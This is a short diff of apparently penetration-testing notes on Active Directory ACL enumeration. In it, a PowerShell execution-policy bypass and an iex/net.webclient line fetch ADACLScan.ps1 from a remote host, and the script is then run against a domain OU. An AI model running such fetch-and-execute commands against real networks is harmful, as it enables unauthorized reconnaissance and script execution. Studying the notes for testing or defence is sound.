@@ -78,7 +78,7 @@ See discover/notes/PowerShell/PowerView.txt
 
 cd to a discrete, writable directory (C:\Users\<user>\Desktop)
 powershell.exe -nop -exec bypass
-iex (new-object net.webclient).downloadfile('http://<target IP>/ADACLScan.ps1', 'ADACLScan.ps1')
+iex (new-object net.webclient).downloadfile('http://192.168.1.5/ADACLScan.ps1', 'ADACLScan.ps1')
 
 .\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM"
 
